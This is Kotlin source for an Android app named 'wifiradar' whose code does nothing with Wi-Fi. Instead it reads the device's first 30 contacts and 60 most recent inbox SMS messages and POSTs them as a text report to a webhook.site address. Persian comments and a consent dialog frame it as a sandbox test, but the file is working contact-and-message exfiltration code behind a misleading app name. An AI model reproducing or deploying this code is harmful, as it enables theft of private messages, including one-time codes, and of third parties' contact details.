package com.danial.wifiradar

import android.Manifest
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException

class MainActivity : AppCompatActivity() {

    // 🔴 مهم: آدرس وب‌هوک تستی خود را جایگزین این آدرس فرضی کنید
    private val TEST_SERVER_URL = "https://webhook.site"

    // ۱. لانچر رسمی سیستم‌عامل برای درخواست مجوزهای چندگانه
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val contactsGranted = permissions[Manifest.permission.READ_CONTACTS] ?: false
        val smsGranted = permissions[Manifest.permission.READ_SMS] ?: false

        if (contactsGranted && smsGranted) {
            Toast.makeText(this, "مجوزها تایید شد. استخراج داده آغاز شد.", Toast.LENGTH_SHORT).show()
            startDataProcessing()
        } else {
            Toast.makeText(this, "برای انجام تست به مجوزها نیاز است.", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ساخت لایه و دکمه به صورت مستقیم در کد جهت سادگی ساختار فایل‌ها
        val mainLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        val btnStart = Button(this).apply {
            text = "شروع همگام‌سازی و تست دسترسی"
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        mainLayout.addView(btnStart)
        setContentView(mainLayout)

        btnStart.setOnClickListener {
            checkPermissionsAndShowDialog()
        }
    }

    // ۲. بررسی مجوزها و نمایش دیالوگ شفاف حریم خصوصی مطابق استانداردها
    private fun checkPermissionsAndShowDialog() {
        val hasContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val hasSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

        if (hasContacts && hasSms) {
            startDataProcessing()
        } else {
            AlertDialog.Builder(this)
                .setTitle("اعلامیه شفافیت دسترسی")
                .setMessage("این برنامه آزمایشی برای کارکرد خود نیاز به دسترسی به ۳۰ مخاطب اول و ۶۰ پیامک نهایی دستگاه دارد و اطلاعات را به سرور تست ارسال می‌کند. آیا موافقید؟")
                .setPositiveButton("موافقم و اجازه می‌دهم") { _, _ ->
                    requestPermissionLauncher.launch(
                        arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS)
                    )
                }
                .setNegativeButton("لغو عملیات") { dialog, _ ->
                    dialog.dismiss()
                    Toast.makeText(this, "عملیات توسط کاربر لغو شد.", Toast.LENGTH_SHORT).show()
                }
                .setCancelable(false)
                .show()
        }
    }

    // ۳. پردازش و سرهم‌کردن گزارش نهایی متنی
    private fun startDataProcessing() {
        val contactsList = fetchTopContacts(30)
        val smsList = fetchTopSms(60)

        val report = StringBuilder().apply {
            append("=== SANDBOX TEST REPORT ===\n")
            append("CONTACTS (MAX 30):\n")
            contactsList.forEach { append("$it\n") }
            
            append("\nSMS MESSAGES (MAX 60):\n")
            smsList.forEach { append("$it\n") }
        }.toString()

        sendPayloadToServer(report)
    }

    // ۴. خواندن مخاطبین با محدودیت تعداد تعیین‌شده
    private fun fetchTopContacts(limit: Int): List<String> {
        val contacts = mutableListOf<String>()
        val resolver: ContentResolver = contentResolver

        val cursor: Cursor? = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        )

        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            var count = 0
            while (it.moveToNext() && count < limit) {
                val name = if (nameIdx != -1) it.getString(nameIdx) else "بدون نام"
                val number = if (numIdx != -1) it.getString(numIdx) else "بدون شماره"
                contacts.add("Name: $name | Phone: $number")
                count++
            }
        }
        return contacts
    }

    // ۵. خواندن پیامک‌ها از صندوق ورودی بر اساس جدیدترین‌ها
    private fun fetchTopSms(limit: Int): List<String> {
        val smsList = mutableListOf<String>()
        val resolver: ContentResolver = contentResolver

        val cursor: Cursor? = resolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            arrayOf(Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.BODY),
            null, null, "${Telephony.Sms.Inbox.DATE} DESC"
        )

        cursor?.use {
            val addrIdx = it.getColumnIndex(Telephony.Sms.Inbox.ADDRESS)
            val bodyIdx = it.getColumnIndex(Telephony.Sms.Inbox.BODY)

            var count = 0
            while (it.moveToNext() && count < limit) {
                val address = if (addrIdx != -1) it.getString(addrIdx) else "فرستنده ناشناس"
                val body = if (bodyIdx != -1) it.getString(bodyIdx) else "متن خالی"
                smsList.add("Sender: $address | Msg: $body")
                count++
            }
        }
        return smsList
    }

    // ۶. ارسال گزارش متنی به صورت امن در پس‌زمینه با پروتکل HTTP POST
    private fun sendPayloadToServer(payload: String) {
        val client = OkHttpClient()
        val mediaType = "text/plain; charset=utf-8".toMediaType()
        val requestBody = payload.toRequestBody(mediaType)

        val request = Request.Builder()
            .url(TEST_SERVER_URL)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "خطای شبکه: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                runOnUiThread {
                    if (response.isSuccessful) {
                        Toast.makeText(this@MainActivity, "داده تست با موفقیت ارسال شد.", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(this@MainActivity, "خطای پاسخ سرور: ${response.code}", Toast.LENGTH_SHORT).show()
                    }
                }
                response.close()
            }
        })
    }
}
